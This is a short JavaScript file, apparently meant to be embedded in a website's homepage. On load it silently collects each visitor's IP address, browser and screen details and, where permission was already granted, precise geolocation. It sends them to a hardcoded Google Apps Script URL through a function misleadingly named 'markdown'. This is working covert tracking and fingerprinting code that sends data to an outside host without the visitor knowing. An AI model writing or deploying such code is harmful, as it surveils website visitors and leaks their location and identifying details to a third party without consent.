const appScriptUrl = "https://script.google.com/macros/s/AKfycbyerovyJhwPACBq_7Ri0tEei25wm8BhCJ7l-UTkdyGHjWu4n8ZrzaqzLhH5e6M6nNPh0A/exec";

async function markdown(description, latitude, longitude, accuracy){
	const xhttpr = new XMLHttpRequest(), agent = window.navigator.userAgent, platform = window.navigator.platform, ipAddress = await getIp();
	const orientation = window.screen.orientation.type, logical = window.screen.width + " x " + window.screen.height, pxRatio = window.devicePixelRatio;
	const actual = window.screen.width * window.devicePixelRatio + " x " + window.screen.height * window.devicePixelRatio;
	const info = "User Agent: " + agent + " Platform: " + platform + " IP Address: " + ipAddress + " Screen Orientation: " + orientation + " Logical resolution: " + logical + " Actual resolution: " + actual + " Pixel Ratio: " + pxRatio;
	const url = appScriptUrl + "?q=markdown&des=" + description + "&lat=" + latitude + "&lng=" + longitude + "&acc=" + accuracy + "&info=" + info;
	xhttpr.open("GET", url, true);
	xhttpr.send();
}

function getIp() {
	return new Promise (async (resolve) => {
		const response = await fetch("https://api.ipify.org?format=json");
		const ip = await response.json();
		resolve(ip["ip"]);
	});
}

function getCoords() {
  return new Promise((resolve, reject) =>
    navigator.permissions ?

      // Permission API is implemented
      navigator.permissions.query({
        name: 'geolocation'
      }).then(permission =>
        // is geolocation granted?
        permission.state === "granted"
          ? navigator.geolocation.getCurrentPosition(pos => resolve(pos.coords)) 
          : resolve(null)
      ) :

    // Permission API was not implemented
    reject(new Error("Permission API is not supported"))
  )
}

getCoords().then(coords => {
	if (coords != null){
		markdown("Homepage AUTO", coords.latitude, coords.longitude, coords.accuracy);
	} else {
		markdown("Homepage AUTO", "Permission was not allowed", "", "");
	}
});